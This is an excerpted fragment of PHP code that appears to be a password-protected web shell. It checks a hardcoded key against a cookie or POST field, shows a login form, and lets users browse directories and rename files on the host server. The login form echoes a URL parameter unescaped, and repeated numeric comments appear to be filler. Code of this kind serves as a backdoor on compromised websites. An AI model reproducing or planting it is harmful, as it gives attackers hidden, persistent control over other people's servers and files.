...
$auth_key = "662d89e7ce486c68bbc6dc22f2b9d1d9";
...
$pass = false;
if (isset($_COOKIE['pw_name_26618'])) {
    if(($_COOKIE['pw_name_26618']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_26618'])) {
        if(($_POST['pw_name_26618']) == $auth_key) {
            setcookie("pw_name_26618", $_POST['pw_name_26618']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_26618' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727777582499770 1727777582976409 1727777582985219 1727777582666663
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727777582499770 1727777582976409 1727777582985219 1727777582666663
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727777582499770 1727777582976409 1727777582985219 1727777582666663
            $name = PATH . "/" . $_GET['r'];
